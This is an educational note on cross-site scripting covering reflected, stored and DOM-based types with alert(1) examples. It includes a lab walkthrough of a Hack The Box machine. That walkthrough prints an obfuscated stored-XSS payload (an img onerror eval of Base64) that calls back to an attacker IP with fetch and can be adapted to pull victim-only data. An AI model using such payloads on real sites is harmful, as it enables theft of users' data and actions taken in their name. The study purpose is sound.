# Cross-Site Scripting

Cross-Site Scripting, or XSS, is a vulnerability that would allow attackers to exploit the interactions that **other users** have with an application. In short, it can allow us to impersonate and perform actions as another user, steal information and in some cases, gain RCE.

The most common way of testing if XSS is present on a website is to call the Javascript alert function. For example, the script tags of HTML can be used :`<script>alert(1)</script>`. \
The image below shows an example of what would pop out.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## How it Works

Browsers and websites allow users to interact with them and perform actions through Javascript. XSS would work via injecting malicious Javascript code to execute on a user's browser. Basically, **scripting across the website**.

There are 3 types of XSS:

1. Reflected XSS
2. Stored XSS
3. DOM Based XSS

### Reflected XSS

Reflected XSS is the simplest form of the exploit. This occurs when a malicious script is reflected off a web application and onto the victim's browser. This script is normally activated through a link or action on the website and would be redirected to the next user.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

An example would be as follows:

* Suppose we have a website that had a URL that displayed a user-controlled term like http://example.com?search=test
* This search term would cause this to appear on the page:
  * `<p>You searched for: test </p>`
* Using Reflected XSS, we can construct a malicious search link that would trigger a pop-up to appear on screen.&#x20;
* Assuming the website does not have any filters, we can input **http://example.com?search=\<script>alert(1)\</script>** as the URL.
* When any client enters this link, our malicious script would execute on their end and the pop-up would show up in their browsers.
* This works because the rendering of HTML would show this:
  * `<p>You searched for: <script>alert(1)</script></p>`
  * The script tags allow for an 'escape' from the paragraph tags, and we can execute Javascript code within the tags.

Reflected XSS attacks still rely on the **victim user to make a request they control**. We still need the victim to perform a specific action in order to exploit this. This could be through sending phishing links or putting links on a website we control.

The reliance on the user makes the impacts of XSS less severe compared to the other forms of XSS.

### Stored XSS

Stored XSS means that the malicious script is stored on the website itself. Then, everytime a user visits the page that the script is on, it would execute. Stored XSS has much more severe impacts, as it only requires users to go visit the site. This can be in the form of a blog post comment, editing the website page to have hidden Javascript, etc.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Here's an example of XSS from the HTB machine, Extension:

After enumeration of the website, we have identified that there is a stored XSS vulnerability in the 'Report Issues' function of the Gitea instance. The victim has been found to visit the Issues tab of the Gitea instance from time to time.&#x20;

This was the payload found to work: `test<test><img SRC="x" onerror=eval.call${"eval\x28atobZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC41LyIp\x29"}>`

How this payload works is through rendering an **image** tag and having a script execute on an **event** called 'onerror', which means if the image fails to load, it would load the script. The scriptis calling an **eval** function which has a Base64 encoded command using **fetch** to connect back to the attacker machine on port 80.

When inputted, the victim would view the Issues and be served this payload. This would result in the victim's browser making a callback to the attacker machine. On the attacker machine, the following callback is received:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

This confirms that the XSS is working properly. For this machine, the payload can be modified to include information about a hidden directory that only the victim can access:

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
